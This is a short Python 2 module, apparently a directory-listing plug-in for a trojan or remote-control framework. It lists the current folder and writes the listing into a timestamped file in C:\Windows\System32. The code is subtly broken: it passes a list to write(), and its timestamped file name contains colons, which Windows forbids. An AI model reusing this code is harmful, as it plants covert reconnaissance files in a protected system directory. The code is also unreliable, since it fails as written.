import os, datetime

def run(**args):

    report_name = str(datetime.datetime.now()) + '.txt'
    report_path = os.path.join('C:\\Windows\\System32', report_name)
    print "[*] In dirlister module."
    data = os.listdir(".")
    with open(report_path, 'w') as f:
        f.write(data)

    return report_path, report_name
